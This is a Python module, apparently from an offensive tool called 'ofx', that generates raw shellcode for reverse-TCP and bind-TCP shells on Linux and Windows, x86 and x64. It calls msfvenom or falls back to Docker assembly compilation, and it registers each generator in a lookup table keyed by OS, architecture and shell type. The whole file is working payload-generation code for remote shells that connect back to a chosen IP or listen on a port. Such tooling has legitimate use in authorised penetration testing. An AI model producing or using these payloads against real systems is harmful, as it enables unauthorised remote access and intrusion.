"""
Binary shellcode templates using msfvenom or Docker assembly compilation.

Two generation methods:
1. Msfvenom: Professional templates (requires msfvenom CLI)
2. Docker Assembly: Compile editable .asm files from data/shellcodes/
"""

import logging
from typing import Callable

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


def _generate_with_msfvenom(os: str, arch: str, type: str, ip: str, port: int) -> bytes:
    """Generate shellcode using msfvenom (tries msfvenom first, falls back to Docker)."""
    try:
        from .msfvenom import get_msfvenom_generator

        return get_msfvenom_generator().generate(os, arch, type, ip, port, format="raw")
    except RuntimeError as e:
        if "msfvenom not found" in str(e):
            logger.warning(f"Msfvenom not available, using Docker assembly compilation")
            from .assembler import get_assembly_compiler

            return get_assembly_compiler().compile(os, arch, type, ip, port)
        raise


# ============================================================================
# Linux x86 Templates
# ============================================================================


def LINUX_X86_REVERSE_TCP(ip: str, port: int) -> bytes:
    """Linux x86 reverse TCP shellcode"""
    return _generate_with_msfvenom("linux", "x86", "reverse", ip, port)


def LINUX_X86_BIND_TCP(ip: str, port: int) -> bytes:
    """Linux x86 bind TCP shellcode"""
    return _generate_with_msfvenom("linux", "x86", "bind", "0.0.0.0", port)


# ============================================================================
# Linux x64 Templates
# ============================================================================


def LINUX_X64_REVERSE_TCP(ip: str, port: int) -> bytes:
    """Linux x64 reverse TCP shellcode"""
    return _generate_with_msfvenom("linux", "x64", "reverse", ip, port)


def LINUX_X64_BIND_TCP(ip: str, port: int) -> bytes:
    """Linux x64 bind TCP shellcode"""
    return _generate_with_msfvenom("linux", "x64", "bind", "0.0.0.0", port)


# ============================================================================
# Windows x86 Templates
# ============================================================================


def WINDOWS_X86_REVERSE_TCP(ip: str, port: int) -> bytes:
    """Windows x86 reverse TCP shellcode"""
    return _generate_with_msfvenom("windows", "x86", "reverse", ip, port)


def WINDOWS_X86_BIND_TCP(ip: str, port: int) -> bytes:
    """Windows x86 bind TCP shellcode"""
    return _generate_with_msfvenom("windows", "x86", "bind", "0.0.0.0", port)


# ============================================================================
# Windows x64 Templates
# ============================================================================


def WINDOWS_X64_REVERSE_TCP(ip: str, port: int) -> bytes:
    """Windows x64 reverse TCP shellcode"""
    return _generate_with_msfvenom("windows", "x64", "reverse", ip, port)


def WINDOWS_X64_BIND_TCP(ip: str, port: int) -> bytes:
    """Windows x64 bind TCP shellcode"""
    return _generate_with_msfvenom("windows", "x64", "bind", "0.0.0.0", port)


# ============================================================================
# Template Registry
# ============================================================================

SHELLCODE_TEMPLATES: dict[str, dict[str, dict[str, Callable[[str, int], bytes]]]] = {
    "LINUX": {
        "X86": {
            "reverse": LINUX_X86_REVERSE_TCP,
            "bind": LINUX_X86_BIND_TCP,
        },
        "X64": {
            "reverse": LINUX_X64_REVERSE_TCP,
            "bind": LINUX_X64_BIND_TCP,
        },
    },
    "WINDOWS": {
        "X86": {
            "reverse": WINDOWS_X86_REVERSE_TCP,
            "bind": WINDOWS_X86_BIND_TCP,
        },
        "X64": {
            "reverse": WINDOWS_X64_REVERSE_TCP,
            "bind": WINDOWS_X64_BIND_TCP,
        },
    },
}
